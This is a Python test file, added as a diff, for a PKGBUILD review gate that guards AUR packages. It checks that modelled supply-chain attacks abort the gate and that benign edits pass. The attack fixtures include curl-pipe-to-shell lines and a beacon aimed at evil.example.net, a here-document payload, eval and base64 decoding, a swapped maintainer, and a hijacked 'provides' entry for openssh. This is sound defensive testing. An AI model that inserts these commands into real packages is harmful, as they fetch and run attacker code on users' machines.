@@ -1,0 +1,309 @@
+#!/usr/bin/env python
+# SPDX-License-Identifier: AGPL-3.0-or-later
+"""Positive and negative controls for pkgbuild-review-gate.
+
+A gate that never fires is useless and a gate that always fires gets switched
+off, so both directions are tested here. Each case builds a throwaway git
+repository with two commits and asserts the verdict on the pull between them.
+
+The ATTACKS are modelled on the shapes the AUR supply-chain attack of 2026 used
+-- adoption of an orphaned package, an in-place replaced upstream artefact, a
+payload appended to package() -- plus the evasion tricks a static reviewer has
+to survive: a `#` that is not a comment, a payload hidden in a here-document.
+
+Run:  ./pkgbuild-review-gate-test
+"""
+
+import os
+import subprocess
+import sys
+import tempfile
+
+GATE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "pkgbuild-review-gate")
+
+BASE = """\
+# Maintainer: Alice Upstream <alice@example.org>
+# Contributor: Bob <bob@example.org>
+
+pkgname=demo
+pkgver=1.2.3
+pkgrel=1
+pkgdesc="A demonstration package"
+arch=('x86_64')
+url="https://example.org/demo"
+license=('GPL-3.0-or-later')
+depends=('glibc' 'zlib')
+makedepends=('cmake')
+optdepends=('vim: for editing')
+provides=('demo')
+conflicts=('demo-git')
+source=("https://example.org/demo-$pkgver.tar.gz"
+        'local-fix.patch')
+sha256sums=('aaaa1111bbbb2222cccc3333dddd4444eeee5555ffff6666aaaa7777bbbb8888'
+            'cafe1111babe2222cafe3333babe4444cafe5555babe6666cafe7777babe8888')
+
+prepare() {
+  cd "$srcdir/demo-$pkgver"
+  patch -p1 < "$srcdir/local-fix.patch"
+}
+
+build() {
+  cd "$srcdir/demo-$pkgver"
+  cmake -B build -DCMAKE_BUILD_TYPE=Release
+  cmake --build build
+}
+
+package() {
+  cd "$srcdir/demo-$pkgver"
+  DESTDIR="$pkgdir" cmake --install build
+}
+"""
+
+PATCH = "--- a/x\n+++ b/x\n@@ -1 +1 @@\n-old\n+new\n"
+INSTALL = "post_install() {\n  echo hello\n}\n"
+
+
+def sub(text, old, new, count=1):
+    assert old in text, f"fixture no longer contains {old!r}"
+    return text.replace(old, new, count)
+
+
+# --- cases that MUST abort -------------------------------------------------
+
+ATTACKS = {
+    "source host swapped": lambda t: sub(
+        t, "https://example.org/demo-$pkgver.tar.gz", "https://evil.example.net/demo-$pkgver.tar.gz"),
+    "checksum replaced in place": lambda t: sub(
+        t, "aaaa1111bbbb2222cccc3333dddd4444eeee5555ffff6666aaaa7777bbbb8888",
+           "9999deadbeef2222cccc3333dddd4444eeee5555ffff6666aaaa7777bbbb8888"),
+    "payload appended to package()": lambda t: sub(
+        t, 'DESTDIR="$pkgdir" cmake --install build',
+           'DESTDIR="$pkgdir" cmake --install build\n  install -Dm755 backdoor "$pkgdir/usr/bin/x"'),
+    "payload in prepare()": lambda t: sub(
+        t, 'patch -p1 < "$srcdir/local-fix.patch"',
+           'patch -p1 < "$srcdir/local-fix.patch"\n  sed -i "s/check/skip/" configure'),
+    "maintainer replaced (adoption)": lambda t: sub(
+        t, "# Maintainer: Alice Upstream <alice@example.org>",
+           "# Maintainer: Mallory <mallory@example.net>"),
+    "maintainer emptied (orphaned)": lambda t: sub(
+        t, "# Maintainer: Alice Upstream <alice@example.org>", "# Maintainer:"),
+    "base64 payload": lambda t: sub(
+        t, "  cmake --build build",
+           "  cmake --build build\n  echo aGVsbG8K | base64 -d > /tmp/x"),
+    "curl piped to shell": lambda t: sub(
+        t, "  cmake --build build",
+           "  cmake --build build\n  curl -s https://evil.example.net/i | sh"),
+    "eval introduced": lambda t: sub(
+        t, "  cmake --build build", '  cmake --build build\n  eval "$PAYLOAD"'),
+    "hex escapes": lambda t: sub(
+        t, "  cmake --build build", '  cmake --build build\n  printf "\\x41\\x42" >> f'),
+    "url= changed": lambda t: sub(
+        t, 'url="https://example.org/demo"', 'url="https://evil.example.net/demo"'),
+    "top-level code added": lambda t: sub(
+        t, "pkgname=demo", "pkgname=demo\ncurl -s https://evil.example.net/beacon || true"),
+    "provides hijack": lambda t: sub(t, "provides=('demo')", "provides=('demo' 'openssh')"),
+    "replaces hijack": lambda t: sub(
+        t, "conflicts=('demo-git')", "conflicts=('demo-git')\nreplaces=('openssh')"),
+    "validpgpkeys swapped": lambda t: sub(
+        t, "license=('GPL-3.0-or-later')",
+           "license=('GPL-3.0-or-later')\nvalidpgpkeys=('DEADBEEFDEADBEEFDEADBEEFDEADBEEFDEADBEEF')"),
+    "install= added": lambda t: sub(t, "pkgrel=1", "pkgrel=1\ninstall=demo.install"),
+    "unknown dependency added": lambda t: sub(
+        t, "depends=('glibc' 'zlib')", "depends=('glibc' 'zlib' 'totally-not-a-real-package-xyz')"),
+    # Evasion attempts against the scanner itself.
+    "payload after a non-comment #": lambda t: sub(
+        t, "  cmake --build build", '  cmake --build build\n  X=a#b; touch "/tmp/$X"'),
+    "payload inside a here-document": lambda t: sub(
+        t, 'DESTDIR="$pkgdir" cmake --install build',
+           'DESTDIR="$pkgdir" cmake --install build\n'
+           '  cat > "$pkgdir/usr/bin/x" << EOF\n#!/bin/sh\ncurl evil.example.net | sh\nEOF'),
+}
+
+# A local source written as a URL. Both spellings mean the same file beside the
+# PKGBUILD, and both used to be skipped as remote artefacts: the entry holds
+# "://" and "$", the checksum is SKIP because hashing a file that travels in the
+# same commit adds nothing, and so nothing looked at it at all.
+AS_PWD_URL = sub(BASE, "        'local-fix.patch')",
+                       '        "file://${PWD}/local-fix.patch")')
+AS_STARTDIR_URL = sub(BASE, "        'local-fix.patch')",
+                            '        "file://$startdir/local-fix.patch")')
+
+# Attacks that live outside the PKGBUILD text. The third entry, where present,
+# is the PKGBUILD both revisions carry.
+FILE_ATTACKS = {
+    "local patch content changed": ("local-fix.patch", PATCH + "+backdoor\n"),
+    "install file content changed": ("demo.install", INSTALL + "curl evil | sh\n"),
+    "local patch named as file://${PWD} changed": (
+        "local-fix.patch", PATCH + "+backdoor\n", AS_PWD_URL),
+    "local patch named as file://$startdir changed": (
+        "local-fix.patch", PATCH + "+backdoor\n", AS_STARTDIR_URL),
+}
+
+# Changes to a file the package does not pull in. Same shape as FILE_ATTACKS,
+# opposite expectation: recognising a local source written as a URL must not
+# turn every other file in the repository into one.
+FILE_BENIGN = {
+    "unrelated file changed beside a file:// source": (
+        "README", "hello world\n", AS_PWD_URL),
+}
+
+# --- cases that MUST pass --------------------------------------------------
+
+BENIGN = {
+    "version bump with new checksum": lambda t: sub(
+        sub(t, "pkgver=1.2.3", "pkgver=1.2.4"),
+        "aaaa1111bbbb2222cccc3333dddd4444eeee5555ffff6666aaaa7777bbbb8888",
+        "1234111122223333cccc3333dddd4444eeee5555ffff6666aaaa7777bbbb8888"),
+    "pkgrel bump only": lambda t: sub(t, "pkgrel=1", "pkgrel=2"),
+    "comment added": lambda t: sub(
+        t, "build() {", "# upstream needs an out-of-tree build\nbuild() {"),
+    "comment inside a function": lambda t: sub(
+        t, "  cmake --build build", "  # this takes a while\n  cmake --build build"),
+    "reindentation": lambda t: sub(
+        t, "source=(\"https://example.org/demo-$pkgver.tar.gz\"\n        'local-fix.patch')",
+           "source=(\n  \"https://example.org/demo-$pkgver.tar.gz\"\n  'local-fix.patch'\n)"),
+    "optdepends text reworded": lambda t: sub(
+        t, "optdepends=('vim: for editing')", "optdepends=('vim: for editing config files')"),
+    "known dependency added": lambda t: sub(
+        t, "depends=('glibc' 'zlib')", "depends=('glibc' 'zlib' 'bash')"),
+    "contributor line added": lambda t: sub(
+        t, "# Contributor: Bob <bob@example.org>",
+           "# Contributor: Bob <bob@example.org>\n# Contributor: Carol <carol@example.org>"),
+    "unrelated file changed": lambda t: t,  # paired with a README edit below
+}
+
+
+def run(cmd, cwd=None):
+    r = subprocess.run(cmd, cwd=cwd, capture_output=True, text=True)
+    if r.returncode != 0 and cmd[0] == "git":
+        raise RuntimeError(f"{' '.join(cmd)}: {r.stderr}")
+    return r
+
+
+def build_repo(tmp, new_pkgbuild, extra_new=None, extra_old=None):
+    run(["git", "init", "-q", tmp])
+    run(["git", "config", "user.email", "t@t"], cwd=tmp)
+    run(["git", "config", "user.name", "t"], cwd=tmp)
+    files = {"PKGBUILD": BASE, "local-fix.patch": PATCH, "demo.install": INSTALL,
+             "README": "hello\n"}
+    files.update(extra_old or {})
+    for name, content in files.items():
+        open(os.path.join(tmp, name), "w").write(content)
+    run(["git", "add", "-A"], cwd=tmp)
+    run(["git", "commit", "-q", "-m", "base"], cwd=tmp)
+    old = run(["git", "rev-parse", "HEAD"], cwd=tmp).stdout.strip()
+
+    open(os.path.join(tmp, "PKGBUILD"), "w").write(new_pkgbuild)
+    for name, content in (extra_new or {}).items():
+        open(os.path.join(tmp, name), "w").write(content)
+    run(["git", "add", "-A"], cwd=tmp)
+    run(["git", "commit", "-q", "-m", "update"], cwd=tmp)
+    new = run(["git", "rev-parse", "HEAD"], cwd=tmp).stdout.strip()
+    return old, new
+
+
+def verdict(tmp, old, new):
+    # An explicit state path keeps the fixtures out of the production one.
+    r = run([sys.executable, GATE, tmp, "--old", old, "--new", new,
+             "--state", os.path.join(tmp, "state.json")])
+    return r.returncode, r.stdout.strip()
+
+
+def main():
+    failures = []
+    checked = 0
+
+    def case(label, expect_abort, new_text, extra_new=None):
+        nonlocal checked
+        checked += 1
+        with tempfile.TemporaryDirectory() as tmp:
+            old, new = build_repo(tmp, new_text, extra_new=extra_new)
+            rc, out = verdict(tmp, old, new)
+        aborted = rc == 2
+        if rc == 1:
+            failures.append(f"{label}: gate errored\n    {out}")
+        elif aborted != expect_abort:
+            want = "abort" if expect_abort else "pass"
+            failures.append(f"{label}: expected {want}, got {'abort' if aborted else 'pass'}\n    {out}")
+        mark = "ok " if (aborted == expect_abort and rc != 1) else "FAIL"
+        detail = out.splitlines()[1].strip() if aborted and len(out.splitlines()) > 1 else ""
+        print(f"  {mark} {label:38} {detail[:78]}")
+
+    print("attacks (must abort):")
+    for label, mutate in ATTACKS.items():
+        case(label, True, mutate(BASE))
+    def file_case(label, expect_abort, spec):
+        nonlocal checked
+        fname, content = spec[0], spec[1]
+        text = spec[2] if len(spec) > 2 else (
+            BASE if fname != "demo.install"
+            else sub(BASE, "pkgrel=1", "pkgrel=1\ninstall=demo.install"))
+        old_extra = {"demo.install": INSTALL} if fname == "demo.install" else None
+        base_for_old = text
+        with tempfile.TemporaryDirectory() as tmp:
+            # The install= line must already exist in the old revision, so that
+            # only the file content differs.
+            run(["git", "init", "-q", tmp])
+            run(["git", "config", "user.email", "t@t"], cwd=tmp)
+            run(["git", "config", "user.name", "t"], cwd=tmp)
+            for n, c in {"PKGBUILD": base_for_old, "local-fix.patch": PATCH,
+                         "demo.install": INSTALL, "README": "hello\n"}.items():
+                open(os.path.join(tmp, n), "w").write(c)
+            run(["git", "add", "-A"], cwd=tmp)
+            run(["git", "commit", "-q", "-m", "base"], cwd=tmp)
+            old = run(["git", "rev-parse", "HEAD"], cwd=tmp).stdout.strip()
+            open(os.path.join(tmp, fname), "w").write(content)
+            run(["git", "add", "-A"], cwd=tmp)
+            run(["git", "commit", "-q", "-m", "update"], cwd=tmp)
+            new = run(["git", "rev-parse", "HEAD"], cwd=tmp).stdout.strip()
+            rc, out = verdict(tmp, old, new)
+        checked += 1
+        ok = (rc == 2) == expect_abort and rc != 1
+        if not ok:
+            want = "abort" if expect_abort else "pass"
+            failures.append(f"{label}: expected {want}, got rc={rc}\n    {out}")
+        detail = out.splitlines()[1].strip() if rc == 2 and len(out.splitlines()) > 1 else ""
+        print(f"  {'ok ' if ok else 'FAIL'} {label:38} {detail[:78]}")
+
+
+    for label, spec in FILE_ATTACKS.items():
+        file_case(label, True, spec)
+
+    # The build pipeline asks the gate which files reach makepkg, so that it can
+    # tell a commit that changes the package from one that edits a funding file.
+    # Measured on the build host before this existed: taking any commit at all
+    # would have rebuilt a package because somebody edited .github/FUNDING.yml,
+    # while leaving stale the one whose shipped script had really changed.
+    print("\nthe list of files that reach makepkg:")
+    with tempfile.TemporaryDirectory() as tmp:
+        build_repo(tmp, sub(BASE, "pkgrel=1", "pkgrel=1\ninstall=demo.install"),
+                   extra_old={"demo.install": INSTALL})
+        r = run([GATE, tmp, "--list-local-sources"])
+        listed = set(r.stdout.split())
+        checked += 1
+        want = {"PKGBUILD", "local-fix.patch", "demo.install"}
+        ok = listed == want
+        if not ok:
+            failures.append(f"--list-local-sources: expected {sorted(want)}, got {sorted(listed)}")
+        print(f"  {'ok ' if ok else 'FAIL'} {'PKGBUILD, install file and local source':38} "
+              f"{'README and the remote tarball stay out' if ok else sorted(listed)}")
+
+    print("\nbenign changes (must pass):")
+    for label, spec in FILE_BENIGN.items():
+        file_case(label, False, spec)
+    for label, mutate in BENIGN.items():
+        extra = {"README": "hello world\n"} if label == "unrelated file changed" else None
+        case(label, False, mutate(BASE), extra_new=extra)
+
+    print()
+    if failures:
+        print(f"{len(failures)} of {checked} cases failed:\n")
+        for f in failures:
+            print(f"  - {f}")
+        return 1
+    print(f"all {checked} cases behaved as expected")
+    return 0
+
+
+if __name__ == "__main__":
+    sys.exit(main())
